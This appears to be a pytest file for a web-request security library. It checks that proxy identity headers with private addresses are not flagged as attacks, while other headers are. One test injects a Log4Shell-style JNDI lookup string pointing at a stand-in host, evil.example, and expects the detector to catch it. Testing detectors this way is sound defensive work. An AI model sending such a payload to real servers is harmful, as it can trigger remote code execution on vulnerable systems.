from collections.abc import Generator

import pytest

from guard_core.sync._utils.detection_config import _DEFAULT_EXCLUDED_HEADERS
from guard_core.sync.handlers.suspatterns_handler import SusPatternsManager
from guard_core.sync.utils import detect_penetration_attempt
from tests.test_sync.conftest import SyncMockGuardRequest

_PROXY_IDENTITY_HEADERS = (
    "forwarded",
    "x-forwarded-for",
    "x-forwarded-host",
    "x-forwarded-proto",
    "x-real-ip",
    "x-client-ip",
    "x-cluster-client-ip",
    "cf-connecting-ip",
    "true-client-ip",
    "fly-client-ip",
    "x-envoy-external-address",
)

_PROXY_IDENTITY_VALUES = (
    "192.168.65.1",
    "10.0.0.5, 172.16.0.1",
    "localhost",
    "for=127.0.0.1;proto=https",
)


@pytest.fixture(autouse=True)
def _reset_suspatterns_singleton() -> Generator[None, None]:
    original_instance = SusPatternsManager._instance
    original_config = SusPatternsManager._config

    SusPatternsManager._instance = None
    SusPatternsManager._config = None

    yield

    SusPatternsManager._instance = original_instance
    SusPatternsManager._config = original_config


def test_proxy_identity_headers_are_in_default_excluded_headers() -> None:
    assert _DEFAULT_EXCLUDED_HEADERS >= set(_PROXY_IDENTITY_HEADERS)


@pytest.mark.parametrize("header", _PROXY_IDENTITY_HEADERS)
@pytest.mark.parametrize("value", _PROXY_IDENTITY_VALUES)
def test_proxy_identity_header_address_value_is_not_flagged(
    header: str, value: str
) -> None:
    request = SyncMockGuardRequest(headers={header: value})

    result = detect_penetration_attempt(request)

    assert result.is_threat is False


@pytest.mark.parametrize("header", _PROXY_IDENTITY_HEADERS)
def test_proxy_identity_header_still_scans_always_scan_pattern(
    header: str,
) -> None:
    request = SyncMockGuardRequest(headers={header: "${jndi:ldap://evil.example/a}"})

    result = detect_penetration_attempt(request)

    assert result.is_threat is True
    assert f"Header '{header}'" in result.trigger_info


def test_non_excluded_header_with_private_address_is_still_flagged() -> None:
    request = SyncMockGuardRequest(headers={"x-not-a-proxy-header": "192.168.65.1"})

    result = detect_penetration_attempt(request)

    assert result.is_threat is True
